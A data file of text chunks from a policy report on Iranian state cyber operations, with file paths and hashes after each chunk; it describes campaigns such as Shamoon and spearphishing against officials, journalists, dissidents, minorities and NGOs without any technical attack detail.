Several Western countries have provided evidence of Iranian cyber operations in indictments and security reports. In addition to Operation Ababil, Iranians were alleged to have gained access to the unclassified Navy Marine Corps Intranet, a system used to store unclassified information and communications, for several months starting in August 2013.78 In the 2016 edition of an annual Ministry of Interior security assessment, the German government cited Iran as a new source of cyber espionage against the country, a disclosure that aligned with reports that the Bundestag had been affected by a malware operation that targeted visitors of the Israeli newspaper Jerusalem Post.79"|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|8eb03bb1ffdc48348eee586e8e0d6f78
"Overall, however, cases of successful Iranian intrusions into American and European governmental infrastructure are rare, particularly highly secured, classified networks. Government agencies are typically hardened beyond the capability of Iranian threat actors to penetrate them. Consequently, Iranians have sought softer U.S. targets, launching spearphishing attempts on the personal email and social media accounts of U.S. government employees. While personal accounts are less likely to contain classified government information, they are also less likely to be properly secured, and often contain useful information such as private material and traces of professional communications. For example, Iranians attempted to compromise the personal email accounts of members of the American team during the nuclear negotiations.80 Similarly, after the 2016 U.S. presidential election, Iranian threat actors focused on former Obama staff, Republican members of Congress, supporters of Donald Trump’s campaign, conservative media organizations, and nominees for political appointments in an apparent attempt to acquire intelligence on the new administration.81 More recently these spearphishing campaigns have targeted critics of Iran in the U.S. Congress while new sanctions have been under consideration.

Tehran tends to target the foreign government personnel and agencies that focus on Iran, namely those in the United States or Europe who work on Iran policy or within Persianlanguage media, including Voice of America television and Radio Farda. Iranian threat actors have used the compromised accounts of prominent Iranian-Americans, international businessmen, and other dual nationals arrested by the IRGC to impersonate them and target the private email accounts of U.S. State Department personnel connected to Iran policy. In contrast to the release of private emails by WikiLeaks during the 2016 U.S. election, which leveraged stolen emails for information warfare, Tehran’s compromise of State Department employees’ emails did not lead to visible sabotage or the disclosure of embarrassing material. While there have been dozens of attempts to target a wide array of American politicians and government employees, these intrusions were mostly opportunistic attempts that did not appear to escalate into more sophisticated operations. Following the 2015 nuclear agreement, the incidence of covert action and retaliatory attacks between Washington and Tehran decreased. Reports of disruptive cyber operations against U.S. and Iranian infrastructure diminished, as Tehran focused more on domestic political opponents and regional adversaries, such as Israel and Saudi Arabia."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|e025ad0d630143e4a2c166f6e69acf81
"Just as Operation Olympic Games provided Washington the ability to coerce Iran without direct military intervention, Tehran now engages in offensive cyber operations to project its regional power.

The two countries are ethnic (Arab vs. Persian), sectarian (Sunni vs. Shia), and above all geopolitical rivals, on opposing ends of bloody proxy wars in Iraq, Syria, and Yemen and fierce political battles in Bahrain and Lebanon.

for purposes of both espionage and disruption. In various reports on Iranian malware and credential theft campaigns—attempts to acquire passwords or account recovery information—Saudi Arabia has been one of the most common sources of victims and targets. This pattern reflects the two countries’ profound geopolitical and ideological disputes (intent), and Saudi Arabia’s continued vulnerabilities in cyberspace (opportunity). Iran’s August 15, 2012, attack on Saudi Aramco during the Muslim Eid holiday (and a similar attack against Qatar’s RasGas Company two weeks later) is a prime example of how Iran uses offensive cyber operations to retaliate against foreign adversaries. As covert actions by foreign actors targeted Iran’s nuclear and oil infrastructure, previously unknown groups began stagShamoon’s message ing disruptive attacks against economic infrastructure in Saudi Arabia and the United States, portraying themappeared clear: Iran selves as independent hacktivists motivated by nationalmay not always be able ism and Islamic values.

To avoid attribution, retaliatory acts were conducted using cutouts that provided them plausible deniability. In the Shamoon attack, known by the name given to the malware, tens of thousands of Saudi Aramco computers were compromised, causing tens to hundreds of millions of dollars in damage. One group, self-identified as the Cutting Sword of Justice, claimed responsibility for the attack, which overwrote the hard drives of Aramco computers with the image of a burning American flag, causing embarrassment to the company.

"Initial analysis of the incident found that Shamoon was likely inspired by the Wiper malware that had targeted Iran in April 2012, given both destroyed stored data as a method of sabotage. Tehran was potentially motivated by retaliation for cyber operations against its oil production infrastructure. Shamoon’s message appeared clear: Iran may not always be able to defend itself against more advanced cyber capabilities, but it can impose substantial retaliatory costs against U.S. allies. The tit-for-tat cycle of covert destructive attacks and symbolic retaliation seen with Shamoon and Ababil reflects Iranian security tactics witnessed in offline hostilities. Between 2010 and 2012, for example, several Iranian nuclear scientists were assassinated under mysterious circumstances, allegedly by the United States or Israel.82 In apparent retaliation, Tehran attempted, unsuccessfully, to assassinate Israeli officials in unexpected places like Georgia, India, and Thailand.

actions, showed Tehran’s ability to learn from attacks and retaliate in a similar fashion, providing a potential framework for understanding its signaling and motivations in conducting disruptive cyber operations.83 Compared to Iran’s other adversaries (namely the United States and Israel), Saudi governmental and economic institutions have yet to sufficiently implement systems and protocols to increase national cybersecurity. Iranian actors have targeted a broad range of economic, military, and political institutions in Saudi Arabia—including Saudi Aramco and its foreign partners, the King Faisal Foundation, the Ministries of Commerce and Foreign Affairs, the Saudi Stock Exchange, and even Saudi Arabian human rights advocates. Researchers have documented multiple cases in which Saudi companies and organizations were compromised, in one event leading to the exfiltration of vast sums of archival proprietary data spanning multiple years from one industrial development corporation.84 Weak Saudi cyber defenses have not only made the country vulnerable to Iranian coercion but also made Riyadh a soft target for Tehran’s retaliation against destructive cyber operations performed by third countries. If Iran cannot cause significant damage to the United States during times of conflict, then damaging the economic institutions of American allies will suffice."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|13c88990494c4d92864ce04c577ee4e2
"The campaign of coercive pressure continues as well: the Saudi Ministry of Defense and other networks sustained DDoS attacks at the same time as the attack on the embassy.85 When the Shamoon malware agent used in the Aramco incident reappeared in an updated form (labeled as Shamoon 2 by researchers) from November 2016 to January 2017, it destroyed databases and files belonging to both the government and private sector, including the General Authority of Civil Aviation, the Ministry of Labor, the Saudi Central Bank, and natural resource extraction companies.86 Shamoon 2 contained references to Yemen and overwrote the victims’ hard drives with an image of the drowned Syrian refugee child Alan Kurdi, once again signaling the attacks were retaliation for Saudi policies in Syria and Yemen.87

ISRAEL One of the consistent pillars in Iran’s foreign policy has been opposition to Israel’s existence and support for anti-Israeli militant groups, such as Hezbollah, Hamas, and Palestinian Islamic Jihad. Despite this, however, Tehran has been far less successful in cyber operations targeting Israeli institutions for disruption and espionage. The documents used as bait in the Madi operation were commonly written in Hebrew or referenced Israeli security policies, and researchers have documented fifty-four compromised entities in Israel during that campaign.88 During the conflict between Israel and Gaza

in the summer of 2014, known as Operation Protective Edge, authorities claimed that the Israel Defense Forces’ infrastructure was targeted by DDoS attacks launched by a wide range of belligerents, including Tehran.89 These DDoS attacks would align with the known capabilities of Iranian threat actors, including the tactics used against the United States and dissidents. Despite a history of DDoS attacks and defacements of Israeli websites, Tehran’s ability to inflict major costs on Israel through cyber operations has thus far been limited and perhaps diminishing.90 Given the sophistication of Israel’s cyber defense, Tehran has been forced to focus mainly on soft targets, for narrow espionage opportunities and the potential disruption of civilian resources in the event of conflict. Iranian targeting of Israelis, like U.S. nationals, emphasizes individuals focused on Iran and regional policies. Tehran has engaged in spearphishing attempts against academic institutions, national security officials, diplomats, members of the Knesset, and Israeli aerospace companies. Similarly, Iranian actors have commonly created malicious domains that have emulated those owned by the American Israel Public Affairs Committee (AIPAC) and have targeted employees of both liberal and conservative Jewish organizations in the United States and elsewhere. While Iran has had some success in compromising smaller civilian institutions, it has not visibly attempted to use these breaches coercively.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|a1fa9781f6114d46a1cf2a1864554726
"The lack of immediate weaponization of breaches is demonstrative of how strategic calculations shape outcomes. The destruction of banking information or medical data over nonexistential challenges to the Islamic Republic is perhaps not worth inviting retaliation from Israel (a threat that Saudi Arabia lacks). Tehran’s desire for signaling a credible retaliatory threat against Israel through offensive cyber operations may also be sufficiently served by the mere compromise of such institutions. Cyber capabilities have certainly not altered the power dynamics between Iran and Israel, and the difference in technical capacities likely shapes Iran’s posture toward its adversary.

REGIONAL ALLIES AND ADVERSARIES While Tehran’s disruptive cyber operations in the region have primarily targeted Saudi Arabia, multiple Iranian threat actors have been observed targeting nearly every Middle Eastern, North African, and bordering country. For example, Magic Kitten successfully compromised victims across the Middle East and South Asia.91 This pattern has been repeated during Madi and subsequent operations up to the present.

Cyber espionage has provided Tehran further insights about its often politically unstable neighbors. Iranian threat actors have shown a recurrent interest in the infrastructure of neighboring countries, including Afghanistan’s National Radio, Ministry of Education, and government network.92 Other indicators also suggest an interest in Pakistan’s and Afghanistan’s security and defense organizations.93 Fictitious social media profiles and spearphishing campaigns have commonly targeted Iraqis, notably engineers within telecommunications networks and political elites. Iranian groups have also maintained an extremely active interest in the political institutions of Iraqi Kurdistan.94 In addition, multiple Iranian threat actors have engaged in spearphishing attempts against dozens of individuals affiliated with human rights organizations, political movements, and independent media outlets in Yemen, where Tehran is engaged in a proxy war with Saudi Arabia.95 The Israeli cybersecurity company ClearSky found that 11 percent of the targets of one Iranian credential theft campaign (Rocket Kitten) in 2015 were connected to Yemen. These operations specifically support Iran’s position in the Yemeni conflict, with recent attempts targeting prominent critics of the Houthis, the Shia Muslim group that Iran has been supporting in the country’s civil war."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|6a23f47a30044343983e2d7b6b87cc3d

While there are credible indications that Tehran has provided Syria traditional electronic warfare equipment, the Assad regime apparently didn’t require extensive help with developing offensive cyber capabilities. An indigenous ecosystem of hackers organized by Assad’s relatives has proven effective at targeting the regime’s opponents from early into the civil war. Small groups of hackers in Syria have typically used spyware that is popular among Arab hacking communities against opponents of Assad. Conversely, while little is known about Hezbollah’s offensive cyber capabilities, in one 2015 report that described their malware and operations, the Lebanese group had seemingly outpaced its Iranian patron.97

The lack of external evidence of cooperation does not preclude other coordinated efforts or intelligence sharing, but basic cyber operations are easier than electronic warfare—such as signal jamming, radar collection, and signal location—or other military domains that require a defense industrial base.98 None of the known capabilities or incidents involved specialized knowledge that required external support, and all have independent profiles on how their operations are conducted. Iranians have not used the same commodity spyware as Syrian groups, suggesting that pro-Assad groups owe more to local hacking scenes than other states. Moreover, Iran’s lack of cooperation with allies or friendly foreign powers may reflect other factors influencing decisions to share resources. Allies still spy on allies: Iran could also want to withhold its toolkit to provide some oversight in contentious situations, such as monitoring the stability and loyalty of the Assad regime."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|8ec6d833896e4cb1b545dd70163523c4
"COMMERCIAL TARGETS Unlike China, Iran has limited use for commercial espionage given its lack of an industrial production sector that could utilize stolen intellectual property. Iran’s industrial espionage activities serve to boost its commodities industries and military technological prowess rather than its domestic manufacturing sector. Nor has Iran attempted to offset the impact of economic sanctions through large-scale financial crime, as North Korea appears to do.99 Based on public reports and directly observed campaigns, the commercial entities targeted by Iranian threat actors typically fall into four categories: •

Evidence of Iran’s interest in the theft of defense secrets comes from several cybersecurity reports, observed incidents, and U.S. indictments. Nima Golestaneh, an Iranian national extradited to the United States from Turkey, pleaded guilty to supporting the October 2012 hack of Vermont-based defense company Arrow Tech Associates in an operation to acquire copies of their weapon system simulations to sell the software to Iranian government and military entities.100 This would prove to be a harbinger of later efforts.

today. Another Iranian threat actor over the course of 2015 to 2016 repeatedly created phony corporate websites for Oshkosh Corporation, an American defense company, to capture credentials from its private internal business network, and continued to target aviation companies, including jet engine manufacturers and satellite companies. Reports of attempts of military espionage by Iranian threat actors are extremely common and include a broad set of industries, most notably aerospace technologies. Yet these operations appear to have had limited success. Given their involvement in the defense industry, coupled with related concerns about Chinese industrial espionage, companies like Oshkosh prioritized information security in ways that NGOs have not. Consequently, while there is indication that employees are commonly targeted, even compromised, reports of the theft of highly sensitive defense secrets by Iran are rare. The targeting of defense companies is also motivated by regional politics rather than solely theft of military technologies.

Many of the American companies—including Oshkosh Corporation—that were designated by the Iranian Ministry of Foreign Affairs in March 2017 under retaliatory human rights sanctions for their involvement with the Israeli military have also been targeted by Iranian cyber operations.101 As in other areas, it is difficult to derive intent purely from who was targeted or impersonated. In certain cases, it appears Iranian threat actors have compromised Middle East–based information technology consultants in pursuit of the governments or businesses who are their clients. These operations often target company employees based in the Middle East, potentially to acquire information on the military capabilities of rivals or access to other targets (such as supply-chain attacks). One more recent campaign masquerading as Boeing and Northrop Grumman appeared focused on Saudi Arabia’s military and commercial aviation sectors.102 Similarly, Iran’s targeting of telecommunications firms, banks, and civil aviation companies could provide them a foothold in critical infrastructure, one that could potentially cause substantial economic harm and even endanger lives.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|d5479c9692e04703a81596d22e7ee3c5
"Thus far, however, Tehran appears to have used such targeting for reconnaissance purposes, mirroring other countries’ cyber activities.103 However, there are legitimate reasons to be concerned that Tehran’s intention in targeting critical infrastructure is to hold social and economic assets in adversarial countries at risk in the event it needs to escalate or retaliate during conflict.

IRAN’S CYBER THREAT

CHAPTER FOUR

IRAN’S INTERNAL TARGETS

The history of Iranian offensive cyber operations has demonstrated that the same threat actors responsible for espionage against the private sector engage in surveillance of human rights defenders, and with considerably more success, given the latter’s resource constraints. Through the lens of such attacks, the relationship between Iran-originated cyber activities and the government as well as the motivations for such operations are made clearer. These communities foreshadow the tactics and tools that will be employed against other targets, and increased information will enable more effective education and mitigation strategies. While the internet has afforded Tehran’s security agencies new possibilities for surveilling and intercepting the communications of its citizens, concurrent information technologies also limit the reach of the state. Iran was one of the first countries in the Middle East to connect to the internet, and as a result over half of the population was frequently using the internet as of March 2017.104 Iranian internet users have been quick to embrace social media and chat applications in large numbers as forums where there are more social freedoms."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|b5f0e6c922b949508e1000f41aacd87c
"As Iranian citizens have moved their communications to internet platforms hosted outside Iran and protected their communications from eavesdropping by using encryption, they have also evaded the more traditional means by which Iranian law enforcement and intelligence agencies perform surveillance.105 Whereas local hosting providers and social media could be compelled to remove content and disclose account ownership information, platforms hosted outside Iran are beyond the direct reach of the state.

The Iranian government has sought to compel foreign firms to comply with requests for user data, without great success.106 Domestic alternatives to foreign services, supported by the state under its national internet plan, have failed to attract significant adoption (Iranian officials themselves tend to use communication tools and social media applications developed in the United States).107 Moreover, millions in the Iranian diaspora— many of whom left Iran because of state repression—live in countries with no security cooperation agreement with Tehran and are less inclined to communicate over insecure Iranian platforms. As a result, in contrast to the first two decades after the revolution, Iranians’ communications and personal activities are increasingly out of the state’s reach. This dynamic has fundamentally altered the nature of state controls. The Iranian government has struggled to respond to the challenges posed by the internet to the state’s information and communication monopoly. Among their first responses was mandatory content filtering, which entailed blocking access to any sites considered pornographic, antireligious, or politically subversive. With the increased availability of circumvention tools, however, filtering became less effective."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|96558570e20f4973800ef958323b8869
"Subsequently, basic offensive cyber operations, such as disrupting adversarial sites during the Green Movement, gave the regime the ability to reassert some control over information flows and project the illusion of the Islamic Republic’s dominance over the internet. Iranian cyber operations are highly adaptable as the online platforms and tools used by the public change. For example, after Iranians shifted to Telegram because of its unfiltered public chat feature and security claims, so too did the attention of Iranian threat actors. Alongside credential theft operations targeting Telegram users, one threat actor appears to have gone as far as mapping all the Telegram accounts connected with Iranian telephone numbers. This information-gathering operation had deeper ties to efforts to target the chat application’s users and aligned with recurrent arrests of administrators from critical Telegram groups. This learning process is repeated elsewhere, including for mobile phones and Macintosh computers.108 Across discrete sets of threat actors and different periods of time, state-aligned offensive cyber operations routinely focus on similar classes of targets, primarily: 1. Government officials 2. Reformist politicians 3. Media professionals 4. Religious minorities 5. Cultural figures 6. Opposition groups, terrorist organizations, and ethnic separatist movements

IRAN’S CYBER THREAT

GOVERNMENT OFFICIALS Numerous Iranian threat actors have sought to compromise members of Hassan Rouhani’s government, the administration of former president Mahmoud Ahmadinejad, and the state’s bureaucratic institutions. The operations target not only government officials but also their relatives, including a sustained campaign directed against Rouhani’s immediate and extended family (particularly his brother and adviser, Hossein Fereydoun).109 Magic Kitten, the earliest known threat actor, from the outset engaged in intrusions of the Islamic Republic of Iran Broadcasting state television network and the Center for Strategic Research, the think tank research arm within the Iranian government’s Expediency Council that was headed by Rouhani at the time. Campaigns targeting the Iranian government are ongoing. The targeting of members of government—individuals that have already been vetted by the regime—reflects the importance of cyber surveillance as a tool of the hardline security establishment to monitor potential rivals for power and accrue sensitive information about people’s lives that could potentially be used for blackmail or humiliation. The Iranian Ministry of Foreign Affairs provides the most prominent and visible example of intergovernmental spying. Iranian diplomats have been frequent targets of spearphishing attempts conducted by IRGC-affiliated threat actors since the beginning of the Rouhani administration."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|b597fcc1b64c45ce9acdd935d83ce6d0
These activities align with accusations in the hardline press that the nuclear deal betrayed Iranian interests.110 The hacking attempts also mirror a history of arrests and pressure brought to bear on members of the diplomatic service accused of spying, including the August 2016 detention of Abdolrasoul Dorri-Esfahani, who served on Iran’s nuclear negotiating team for the JCPOA.111 Whereas diplomacy requires interacting with officials from foreign governments and external experts, these contacts can quickly be portrayed as engaging in espionage for foreign powers. While Foreign Minister Javad Zarif and other figures have been the targets of social media defacements and threats, the campaigns conducted by the indigenous threat actors outlined in this report differ in their intent from simple hacktivism or vandalism. The objective is the collection of personal information from private accounts on international platforms and the monitoring of intimate political and professional networks of government officials.112 These tactics include the typical credential theft attempts against personal email accounts seen elsewhere; however, special effort has been made to compromise government officials and their family members through elaborate deception and by using privileged resources.113 Once compromised, those accounts have been then turned on their diplomatic contacts and peers.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|fa77c0c743484befb06a6e36fc94d64e

The diplomatic core is not the only target of intragovernmental spying: several cabinet officials of the Rouhani administration have had their personal email accounts targeted and compromised.115 The cyber operations conducted by Iranian threat actors have extended beyond immediate members of government to target members of the Shia religious establishment, which undergirds the state’s ideology and political affairs. Campaigns have compromised multiple individuals located in Qom, the center of Iranian religious matters, including hosts within the Center for Services of Islamic Seminaries and Islamic Propagation Office of Qom."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|fd65a01516b5446ea9c9de4150a4b386
REFORMIST POLITICIANS The accounts of Iranian reformers are a primary target for Iranian threat actors. Though reformers profess loyalty to the revolution and the Islamic Republic, they favor less state intervention in society and a less confrontational foreign policy, prioritizing the country’s national interests before revolutionary ideology. Consequently, they have been increasingly purged from Iranian politics and there is a media and travel ban against their most prominent leader, former president Mohammad Khatami (who served from 1997 to 2005).116 After the Green Movement, associates of the former reformist presidential candidates Mehdi Karroubi and Mir-Hossein Mousavi were aggressively targeted by the regime to try and stifle their activities, even those who had fled under threat of prosecution. Unwilling to allow a repeat of the Green Movement, the regime tightened information controls in the run-up to the 2013 presidential election of Hassan Rouhani.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|6b9fdc914a8d49ac95e280ebca6fbb3d
"Access to popular anticensorship tools was cut off, and internet speeds were throttled until after the election results were announced.117 During this time, several Iranian actors began to concurrently target the accounts of Iranian political dissidents.118 Offline, the families of international Persian-language media employees were harassed, and reporters inside Iran were subject to censorship or arrest.119 One of the first known cases of politically motivated hacking in Iran was when the blog of Mohammad-Ali Abtahi, the former vice minister of the Ministry of Culture and Islamic Guidance under Khatami, was defaced after he wrote about the arrest of bloggers in 2005.120 Since then, Abtahi has been repeatedly targeted and impersonated by different Iranian threat actors in credential theft and social engineering operations.121 Abtahi’s experience is emblematic of such group’s priority on reformists. Public figures in the reformist movement from all different segments of society and politics have been targeted. Not only the overtly repressed activists connected to Khatami, Karroubi, and Mousavi but former government officials, religious scholars, politicians, and professors.

IRAN’S CYBER THREAT

The cyber operations against reformists have been broad, successful, and frequent. One threat actor maintained access to a computer used by a reformist cleric and a deputy at a prominent Iranian university for months, watching him conduct political operations and media interviews.122 Similarly, in December 2015 the Facebook account of Gholam Ali Rajaee, a political activist close to former president Akbar Hashemi Rafsanjani, was used to spearphish the accounts of journalists and others.123 The previous year, that same threat actor, Rocket KitThe cyber operations ten, had also successfully compromised a number of former parliament members and other reformists in against reformists have the diaspora, some of whom were later arrested. been broad, successful, Young activists mobilizing for reformists were targeted and frequent. with malware and credential theft operations in the lead up to the February 2016 parliamentary election, particularly those connected to female candidates. The targeting often aligns with offline pressure from the IRGC and Intelligence Ministry: when the office of one reformist close to Rouhani was raided in May 2017, he was targeted in repeated spearphishing attempts. Despite the ascent of moderates to more positions of power, reformists remain a primary target of the government’s cyber capabilities."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|76e24545318547b3bdb0907d21f3eeff
"MEDIA PROFESSIONALS Iranian cyber operations have repeatedly focused on journalists working with reformist media outlets and international satellite broadcasters that fall immediately outside the strict state-sanctioned narratives. Multiple Iranian threat actors conducted numerous credential theft attempts, using fake service notifications, against Iran-based foreign correspondents and Iranian journalists working for prominent publications such as Shargh and the Iranian Labor News Agency. Similarly, freelance reporters inside Iran are frequently compromised through fictitious personas that send them malware purporting to be news content. These campaigns have often targeted publications that would later be closed and journalists who would be detained by Iranian security forces. These incidents are also often timed with elections, normally periods when the government has more aggressively prosecuted journalists. The case of Jason Rezaian, the Washington Post’s former correspondent in Iran, is illustrative of state-aligned threat actors’ focus on foreign press working in Iran. Before his arrest on July 22, 2014, and eighteen-month imprisonment by the IRGC, Rezaian had been the target of concerted intrusion efforts by Flying Kitten. The threat actor attempted to

compromise Rezaian’s Hotmail and Gmail accounts on multiple occasions through credential theft attempts launched from fictitious security addresses; these attempts warned of spam being sent from the account and of other hacking threats. The emails were not themselves technically sophisticated, as the English used in the messages was poor and the approach was amateurish. However, the behavior in these incidents was unique in that Rezaian’s accounts were singled out from a small set of targets several months prior to his arrest."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|07f09fa03e0345479907da444a9871ca
"RELIGIOUS MINORITIES Iranian religious minorities are obvious targets of the Iranian security forces, most notably adherents of the highly persecuted Baha’i faith, who have long been accused of promoting conspiracies against the Islamic government.124 With the widespread adoption of the internet, the Baha’i leadership, based mostly in the United States and Haifa, Israel, enjoyed new organizational and communication opportunities otherwise denied to them offline. Those same technologies, however, also gave the Iranian state new capabilities for intelligence gathering and propaganda dissemination against the Baha’i. In April 2014, the Gmail account of a former director of external affairs for the U.S. Baha’i organization was accessed from inside Iran. The director had a history of international advocacy on behalf of the Baha’i Assembly that included testifying before Congress on the status of religious minorities in Iran. This made her a natural target for Iran.

Prominent members of the faith, including the diaspora relatives of imprisoned Baha’i leaders in Iran, continue to be subjected to sustained cyber operations. Similarly, cutout groups as recently as February 2017 defaced Baha’i sites with pro-regime propaganda coinciding with events such as the anniversary of the Islamic Revolution. The ongoing targeting of the Baha’i and the defacement of their sites underscores the Iranian regime’s concern with organizations it perceives as subversive and its use of disruptive attacks to buttress the ideological agenda of the state.

IRAN’S CYBER THREAT

The religious targets of Iranian cyber operations have not been limited to aggressively marginalized groups such as the Baha’is but also include recognized religious communities such as Christians, Jews, Zoroastrians, and Sunni Muslims. In one example, a mainstream Jewish community leader in Tehran was compromised through malware and surveilled as he went about coordinating events and managing a local religious publication. Still other spearphishing campaigns have routinely targeted evangelical Christian converts, atheists, or new age religious sects. More broadly, a malware campaign posing as information on the persecution of Christian converts was sent to human rights organizations, and fictitious profiles have posed as religious minorities to infiltrate evangelical Persian-language networks.125"|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|b544ed4ee9b4451597646621d5258178
CULTURAL FIGURES Iran-originating spearphishing campaigns have also targeted Iranian cultural figures—including artists, musicians, comedians, cartoonists, and satirists—regardless of whether they reside in Iran or abroad. These campaigns have included the targeting and compromise of social media and email accounts for the Germany-based musician Shahin Najafi, multiple pop stars that left Iran after the Islamic Revolution, a Persian-Israeli singer, and an Iranian-born female metal musician based in the United States, among others. There have also been intrusions into devices and accounts associated with less prominent underground artists inside Iran and networks of fictitious social network profiles connected with Iranian death metal rock bands and hip-hop groups. These themes of targeting famous pop musicians and their staff—both inside Iran and abroad—are recurrent and do not focus solely on individuals critical of the establishment. Iranian security forces have publicly acknowledged their operations to identify individuals involved in “immoral behavior” online. In January 2016, several Iranian fashion models popular on social media were arrested for their activities online and forced to delete their accounts, an effort labeled by the IRGC as Operation Spider.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|a8cff8eb578a48dfabbfc1f6bcd3d6d8
"At the same time, the arrests of employees of the foreign-based AAA Music television channel led to their social media accounts being defaced with a message, purportedly from the Ministry of Intelligence, about the illegality of the network. In interviews with and public statements by those rounded up in Operation Spider, these individuals were commonly operating openly, and the defacements were conducted after they were forced to hand over passwords. Operation Spider was not the first of its kind: the activities of Flying Kitten suggest an earlier interest in surveillance of the Iranian fashion industry.126 In early 2014, the threat

actor compromised the computer of a social media model that was popular for portraying a fashionable lifestyle without wearing the state-mandated hijab.127 After the intrusion she retreated offline, stopped logging on to modeling sites, and deleted her Facebook account. Her image was also appropriated for further operations against other communities. The opaque nature of campaigns such as Operation Spider obscures how Iranian authorities track down people like online models. However, incidents such as the Flying Kitten compromise and the infiltration of LGBT-support networks and sex worker social media communities by others suggest a relationship between both efforts."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|8b59fb7614af44f6937316226909b172
OPPOSITION GROUPS, TERRORIST ORGANIZATIONS, AND ETHNIC SEPARATIST MOVEMENTS Despite its labeling of civil dissent as a threat to national security, Iran does face real threats of terrorism and organized crime from nonstate actors, evidenced by the self-proclaimed Islamic State’s June 2017 attacks on its parliament and the mausoleum of former Iranian supreme leader Ayatollah Ruhollah Khomeini. While documentation of Iranian cyber operations by international researchers has typically assumed that all domestic targets of intrusion campaigns are political dissidents, a small portion of these campaigns focus on areas in which law enforcement hacking has become internationally normalized, chiefly in the collection of evidence and intelligence on violent terrorist activities and financial crime. For instance, Iranian threat actors have actively sought to compromise the digital operations of Sunni jihadi movements through credential theft, malware, and other intrusions.128 To compromise Islamist organizations, Iranian actors have leveraged bait documents and messages in Persian and Arabic and posed as media organizations such as Al Jazeera and Al Arabiya. Flying Kitten attempted to spread malware by posting comments on Al Arabiya’s Facebook page purporting to promote jihadism.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|4f1d2c954d914033a18724517ab9173a
"These intelligence efforts have targeted jihadi groups across the Middle East and North Africa, Pakistan, and Afghanistan, including the Islamic State and al-Qaeda, while focusing on Iraqi and Persianlanguage groups.129 Security-related cyber operations extend as well to fringe political organizations that have previously engaged in hostilities against the Islamic Republic.130 Iranian threat actors have successfully compromised individuals affiliated with front groups for Mojahedin-e Khalq (MeK) opposition group, including the Iranian American Society of Texas and the Simay Azadi television station. These intrusions provided access to private Facebook discussion groups and intra-organizational planning for MeK rallies, Telegram channels,

and MeK television programming. Given the MeK’s past disclosures on Iran’s nuclear program, which the organization has claimed were conducted through an in-country network of collaborators, these activities also constitute a counterespionage program. Iranian threat actors also maintain a significant focus on disenfranchised ethnic minorities advocating for greater autonomy. One recurrent target has been Baluchi groups, a Sunni Muslim population located in both Iran and Pakistan. The news outlets and social media accounts of Baluchi militant organizations, such as Jundallah, have repeatedly been targeted by Tehran. These operations include breaching multiple Jundallah affiliated sites as early as July 2010 to push malware to their visitors, a “watering hole attack” designed to surveil violent separatists that would be of interest to Iranian security agencies.131 In other cases, from a different threat actor, Jundallah was targeted using malware hosted on domains purporting to be related to the Free Syrian Army and sent in emails claiming to provide documentation of attacks against the IRGC.

Newroz TV was also compromised by the Flying Kitten malware in 2014, indicating an overlap not only in the threat actors’ mandates but also in their exact targets. Still other groups have used fictitious LinkedIn profiles to connect to representatives of the Kurdistan Regional Government in Iraq. Judging from computer names and other indicators, many more of those compromised by Iranian malware were in Iran’s Kurdistan province, while others were found in Iraqi Kurdistan, or among the Kurdish population in Europe.

CIVIL SOCIETY The internet has facilitated communication and organization between Iranians and foreign and diaspora organizations, but it has also increased the Iranian government’s opportunities for surveillance and repression against foreign-based operations. Though many foreign civil society organizations have been the subject of sustained attempts at infiltration and disruption by Iran, few appear to have incurred attacks of such persistence and aggression as those against the Eurasia Foundation, an NGO in Washing-

As part of its Iran-focused social development programs, the Eurasia Foundation in October 2009 launched the Khorshid School of Entrepreneurship, which promoted women’s entrepreneurship through distance learning courses and the creation of professional networking opportunities. Eurasia Foundation’s programs and organizational history connect closely with Khamenei’s fears of a Velvet Revolution. It would later launch several more online Persianlanguage programs covering a range of issues, from social entrepreneurship to family law. The first intrusion attempt occurred shortly after an article was published in the hardline Iranian newspaper Kayhan in February 2014. It accused the Eurasia Foundation of engaging in social engineering by establishing networks of women and teachers to foment grassroots economic, political, and social pressure on the regime—all under the direction of the U.S. Agency for International Development and the U.S. State Department. Ten days after the article appeared, Flying Kitten began its spearphishing campaign against the Eurasia Foundation."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|39bc74e265314348b34521f92427ca4e
"For the next two years, the Eurasia Foundation would continue to be the target of malware, credential theft, and social engineering by diverse threat actors with diverse strategies.133 The campaign against the Eurasia Foundation is emblematic of Iran’s long and ongoing history of cyber operations against U.S.-based NGOs. U.S. think tanks have been a focus of interest, with targets such as the American Enterprise Institute and the Council on Foreign Relations singled out by multiple Iranian threat actors. The same Iranians that targeted the Eurasia Foundation in December 2015 also impersonated the network administrators at multiple Washington, DC, foreign policy institutions critical of the Iranian government to compromise employees. Nor are these efforts directed only at Iran’s detractors. Organizations advocating improved relations with Iran or nonpolitical researchers have been routinely targeted—the common denominator appears to be simply a policy interest in Iranian affairs.

